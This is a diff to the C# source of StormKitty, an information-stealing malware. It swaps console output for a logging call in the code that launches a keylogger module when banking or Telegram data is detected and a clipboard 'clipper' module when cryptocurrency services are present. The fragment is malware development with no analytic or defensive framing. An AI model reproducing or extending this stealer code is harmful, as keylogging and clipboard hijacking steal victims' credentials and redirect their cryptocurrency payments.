@@ -4,7 +4,6 @@
 */
 
 using Stealer;
-using System;
 using System.Net;
 using System.Threading;
 
@@ -72,7 +71,7 @@ namespace StormKitty
             // Run keylogger module
             if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
             {
-                Console.WriteLine("Starting keylogger modules...");
+                Logging.Log("Starting keylogger modules...");
                 W_Thread = WindowManager.MainThread;
                 W_Thread.SetApartmentState(ApartmentState.STA);
                 W_Thread.Start();
@@ -81,7 +80,7 @@ namespace StormKitty
             // Run clipper module
             if (Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1")
             {
-                Console.WriteLine("Starting clipper modules...");
+                Logging.Log("Starting clipper modules...");
                 C_Thread = ClipboardManager.MainThread;
                 C_Thread.SetApartmentState(ApartmentState.STA);
                 C_Thread.Start();
